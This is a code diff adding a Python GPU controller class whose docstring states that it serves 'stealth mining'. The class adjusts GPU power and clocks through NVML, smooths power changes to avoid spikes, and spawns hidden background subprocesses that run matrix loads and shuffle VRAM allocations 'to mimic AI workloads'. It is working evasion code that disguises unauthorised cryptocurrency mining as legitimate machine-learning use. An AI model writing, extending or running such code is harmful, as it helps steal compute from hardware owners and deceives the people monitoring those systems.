@@ -1075,3 +1075,431 @@ class HardwareController:
     #             error_msg=str(e)
     #         )
 
+
+###############################################################################
+#                     OPTIMIZED HARDWARE CONTROLLER                          #
+###############################################################################
+
+class OptimizedHardwareController:
+    """
+    ✅ ENHANCED: Hardware controller tối ưu không dùng GPU plugins
+    Focus on NVML và compute-based control cho stealth mining
+    
+    Features:
+    - Temperature safety checks with emergency scaling
+    - NVML-first control with compute simulation fallback
+    - Dynamic VRAM management to mimic AI workloads
+    - Smooth power transitions to avoid spikes
+    - Baseline verification and adjustment
+    """
+    
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+        """
+        Initialize OptimizedHardwareController
+        
+        :param config: Configuration dict
+        :param logger: Logger instance
+        """
+        self.logger = logger
+        self.config = config
+        
+        # Initialize GPU manager
+        self.gpu_manager = GPUResourceManager(config, logger)
+        
+        # Check NVML availability
+        self.nvml_available = self.gpu_manager.is_nvml_initialized()
+        
+        # Baseline metrics
+        self.baseline_power = config.get('baseline_power', 150)  # Watts
+        self.baseline_temp = config.get('baseline_temp', 65)     # Celsius
+        self.baseline_vram = config.get('baseline_vram', 4.0)     # GB
+        
+        # Safety thresholds
+        self.temp_critical = config.get('temp_critical', 78)      # Critical temp
+        self.temp_warning = config.get('temp_warning', 72)       # Warning temp
+        self.power_max = config.get('power_max', 200)            # Max power
+        
+        # Profile settings
+        self.profile = config.get('optimization_profile', {
+            'vram_allocation': 0.5,    # 50% of available VRAM
+            'power_variation': 0.15,   # ±15% power variation
+            'clock_variation': 0.10,   # ±10% clock variation
+            'duty_cycle': 0.85        # 85% compute duty cycle
+        })
+        
+        # Active subprocess tracking
+        self.active_subprocesses = []
+        
+        # Verification tracking
+        self.last_verification = 0
+        self.verification_interval = 30  # seconds
+        
+        self.logger.info(f"✅ OptimizedHardwareController initialized (NVML: {self.nvml_available})")
+    
+    def apply_optimization(self, pid: int, params: Dict[str, Any]) -> bool:
+        """
+        Apply optimization với fallback strategy
+        
+        :param pid: Process ID to optimize
+        :param params: Optimization parameters
+        :return: Success status
+        """
+        try:
+            success = True
+            
+            # Step 1: Temperature check (CRITICAL)
+            if not self._temperature_safety_check():
+                self.logger.warning("⚠️ Temperature safety check triggered")
+                params = self._emergency_scaling(params)
+            
+            # Step 2: Try NVML control first
+            if self.nvml_available:
+                self.logger.debug("Applying NVML controls...")
+                success &= self._apply_nvml_controls(params)
+            else:
+                # Fallback: Compute-based simulation
+                self.logger.debug("NVML not available, using compute simulation...")
+                success &= self._apply_compute_simulation(params)
+            
+            # Step 3: VRAM management (always available)
+            self.logger.debug("Managing VRAM allocation...")
+            success &= self._manage_vram_allocation(params)
+            
+            # Step 4: Verify and adjust
+            if self._should_verify_baseline():
+                self.logger.debug("Verifying baseline metrics...")
+                self._verify_and_adjust_baseline()
+            
+            return success
+            
+        except Exception as e:
+            self.logger.error(f"❌ Optimization failed: {e}")
+            import traceback
+            self.logger.debug(traceback.format_exc())
+            return False
+    
+    def _temperature_safety_check(self) -> bool:
+        """
+        Check GPU temperature for safety
+        
+        :return: True if safe, False if over threshold
+        """
+        try:
+            temp = self.gpu_manager.get_gpu_temperature(0)  # GPU 0
+            if temp is None:
+                self.logger.warning("Cannot read GPU temperature, assuming safe")
+                return True
+            
+            if temp >= self.temp_critical:
+                self.logger.error(f"🔥 CRITICAL: GPU temp {temp}°C >= {self.temp_critical}°C")
+                return False
+            elif temp >= self.temp_warning:
+                self.logger.warning(f"⚠️ WARNING: GPU temp {temp}°C >= {self.temp_warning}°C")
+                return True  # Still safe but needs attention
+            else:
+                self.logger.debug(f"✅ GPU temp {temp}°C is safe")
+                return True
+                
+        except Exception as e:
+            self.logger.error(f"Temperature check failed: {e}")
+            return True  # Assume safe if can't check
+    
+    def _emergency_scaling(self, params: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Scale down parameters for emergency temperature control
+        
+        :param params: Original parameters
+        :return: Scaled parameters
+        """
+        scaled = params.copy()
+        
+        # Reduce power by 30%
+        if 'power_limit' in scaled:
+            scaled['power_limit'] = int(scaled['power_limit'] * 0.7)
+            self.logger.info(f"Emergency: Reducing power to {scaled['power_limit']}W")
+        
+        # Reduce clocks by 20%
+        if 'sm_clock' in scaled:
+            scaled['sm_clock'] = int(scaled['sm_clock'] * 0.8)
+            self.logger.info(f"Emergency: Reducing SM clock to {scaled['sm_clock']}MHz")
+        
+        # Add aggressive fan control
+        scaled['fan_increase'] = 30.0  # 30% fan increase
+        
+        return scaled
+    
+    def _apply_nvml_controls(self, params: Dict[str, Any]) -> bool:
+        """
+        Apply controls via NVML nếu available
+        
+        :param params: Control parameters
+        :return: Success status
+        """
+        try:
+            gpu_handle = pynvml.nvmlDeviceGetHandleByIndex(0)
+            
+            # Set power limit với smooth transition
+            if 'power_limit' in params:
+                current_power = self._get_current_power()
+                target_power = params['power_limit']
+                
+                # Smooth transition để tránh spikes
+                if abs(target_power - current_power) > 20:
+                    # Step-wise adjustment
+                    steps = 3
+                    for i in range(steps):
+                        intermediate = current_power + (target_power - current_power) * (i+1) / steps
+                        try:
+                            pynvml.nvmlDeviceSetPowerManagementLimit(
+                                gpu_handle, int(intermediate * 1000)  # mW
+                            )
+                            time.sleep(0.1)
+                        except pynvml.NVMLError as e:
+                            self.logger.warning(f"Cannot set power limit: {e}")
+                else:
+                    try:
+                        pynvml.nvmlDeviceSetPowerManagementLimit(
+                            gpu_handle, int(target_power * 1000)  # mW
+                        )
+                    except pynvml.NVMLError as e:
+                        self.logger.warning(f"Cannot set power limit: {e}")
+                
+                self.logger.info(f"✅ Set power limit to {target_power}W")
+            
+            # Set clocks nếu supported
+            if 'sm_clock' in params and 'memory_clock' in params:
+                try:
+                    pynvml.nvmlDeviceSetApplicationsClocks(
+                        gpu_handle,
+                        params['memory_clock'],
+                        params['sm_clock']
+                    )
+                    self.logger.info(f"✅ Set clocks: SM={params['sm_clock']}MHz, Mem={params['memory_clock']}MHz")
+                except pynvml.NVMLError as e:
+                    self.logger.warning(f"Cannot set GPU clocks: {e}")
+            
+            return True
+            
+        except Exception as e:
+            self.logger.warning(f"NVML control failed: {e}")
+            return False
+    
+    def _get_current_power(self) -> float:
+        """
+        Get current GPU power usage
+        
+        :return: Power in Watts
+        """
+        try:
+            gpu_handle = pynvml.nvmlDeviceGetHandleByIndex(0)
+            power_mw = pynvml.nvmlDeviceGetPowerUsage(gpu_handle)
+            return power_mw / 1000.0  # Convert to Watts
+        except:
+            return self.baseline_power  # Return baseline if can't read
+    
+    def _apply_compute_simulation(self, params: Dict[str, Any]) -> bool:
+        """
+        Fallback: Simulate power variation via compute load
+        
+        :param params: Control parameters
+        :return: Success status
+        """
+        try:
+            # Calculate duty cycle based on target power
+            target_power = params.get('power_limit', self.baseline_power)
+            duty_cycle = target_power / self.baseline_power
+            duty_cycle = max(0.5, min(1.0, duty_cycle))
+            
+            # Launch compute kernel với duty cycle
+            compute_cmd = f"""
+python3 -c "
+import torch
+import time
+import sys
+
+try:
+    # Allocate tensors
+    a = torch.randn(2000, 2000, device='cuda')
+    b = torch.randn(2000, 2000, device='cuda')
+    
+    # Run với duty cycle
+    work_time = {duty_cycle * 0.1}  # 100ms window
+    sleep_time = {(1 - duty_cycle) * 0.1}
+    
+    for _ in range(10):
+        start = time.time()
+        while time.time() - start < work_time:
+            c = torch.matmul(a, b)
+            torch.cuda.synchronize()
+        time.sleep(sleep_time)
+except Exception as e:
+    print(f'Compute simulation error: {{e}}', file=sys.stderr)
+" &
+            """
+            
+            proc = subprocess.Popen(
+                compute_cmd, 
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            
+            self.active_subprocesses.append(proc)
+            self.logger.info(f"✅ Launched compute simulation (duty cycle: {duty_cycle:.2f})")
+            
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Compute simulation failed: {e}")
+            return False
+    
+    def _manage_vram_allocation(self, params: Dict[str, Any]) -> bool:
+        """
+        Manage VRAM để mimic AI workload
+        
+        :param params: Control parameters
+        :return: Success status
+        """
+        try:
+            target_percent = params.get('vram_allocation', self.profile.get('vram_allocation', 0.5))
+            
+            # Get available VRAM
+            total_vram = self._get_total_vram()
+            target_bytes = int(total_vram * target_percent)
+            target_mb = target_bytes // (1024**2)
+            
+            # Allocate với rotation pattern
+            allocation_cmd = f"""
+python3 -c "
+import torch
+import time
+import random
+import sys
+
+try:
+    # Target allocation
+    target_mb = {target_mb}
+    
+    # Allocate với variation
+    allocated = []
+    for i in range(3):
+        size = int(target_mb * random.uniform(0.3, 0.4))
+        tensor = torch.zeros(
+            size, 1024, 1024 // 4,
+            dtype=torch.float32, 
+            device='cuda'
+        )
+        allocated.append(tensor)
+        time.sleep(2)
+    
+    # Hold và rotate
+    for _ in range(10):
+        # Randomly deallocate and reallocate
+        if random.random() < 0.3:
+            idx = random.randint(0, 2)
+            del allocated[idx]
+            torch.cuda.empty_cache()
+            
+            size = int(target_mb * random.uniform(0.3, 0.4))
+            allocated.insert(idx,
+                torch.zeros(
+                    size, 1024, 1024 // 4,
+                    dtype=torch.float32, 
+                    device='cuda'
+                )
+            )
+        
+        # Small computation để maintain activity
+        if allocated:
+            allocated[0] *= 1.001
+        
+        time.sleep(3)
+except Exception as e:
+    print(f'VRAM allocation error: {{e}}', file=sys.stderr)
+" &
+            """
+            
+            proc = subprocess.Popen(
+                allocation_cmd,
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            
+            self.active_subprocesses.append(proc)
+            self.logger.info(f"✅ VRAM allocation pattern started ({target_mb}MB, {target_percent:.1%})")
+            
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"VRAM management failed: {e}")
+            return False
+    
+    def _get_total_vram(self) -> int:
+        """
+        Get total VRAM in bytes
+        
+        :return: Total VRAM bytes
+        """
+        try:
+            gpu_handle = pynvml.nvmlDeviceGetHandleByIndex(0)
+            mem_info = pynvml.nvmlDeviceGetMemoryInfo(gpu_handle)
+            return mem_info.total
+        except:
+            return int(self.baseline_vram * 1024**3)  # Convert GB to bytes
+    
+    def _should_verify_baseline(self) -> bool:
+        """
+        Check if baseline verification is needed
+        
+        :return: True if verification needed
+        """
+        current_time = time.time()
+        if current_time - self.last_verification > self.verification_interval:
+            self.last_verification = current_time
+            return True
+        return False
+    
+    def _verify_and_adjust_baseline(self):
+        """
+        Verify current metrics against baseline and adjust if needed
+        """
+        try:
+            # Get current metrics
+            current_power = self._get_current_power()
+            current_temp = self.gpu_manager.get_gpu_temperature(0)
+            
+            # Check deviations
+            power_deviation = abs(current_power - self.baseline_power) / self.baseline_power
+            
+            if power_deviation > 0.3:  # 30% deviation
+                self.logger.warning(f"⚠️ Power deviation: {power_deviation:.1%}")
+                # Adjust baseline
+                self.baseline_power = current_power * 0.7 + self.baseline_power * 0.3
+                self.logger.info(f"Updated baseline power to {self.baseline_power:.1f}W")
+            
+            if current_temp and abs(current_temp - self.baseline_temp) > 10:
+                self.logger.warning(f"⚠️ Temperature deviation: {current_temp - self.baseline_temp:.1f}°C")
+                # Adjust baseline
+                self.baseline_temp = current_temp * 0.5 + self.baseline_temp * 0.5
+                self.logger.info(f"Updated baseline temp to {self.baseline_temp:.1f}°C")
+            
+        except Exception as e:
+            self.logger.error(f"Baseline verification failed: {e}")
+    
+    def cleanup(self):
+        """
+        Clean up active subprocesses
+        """
+        for proc in self.active_subprocesses:
+            try:
+                proc.terminate()
+                proc.wait(timeout=5)
+            except:
+                try:
+                    proc.kill()
+                except:
+                    pass
+        
+        self.active_subprocesses.clear()
+        self.logger.info("✅ Cleaned up OptimizedHardwareController")
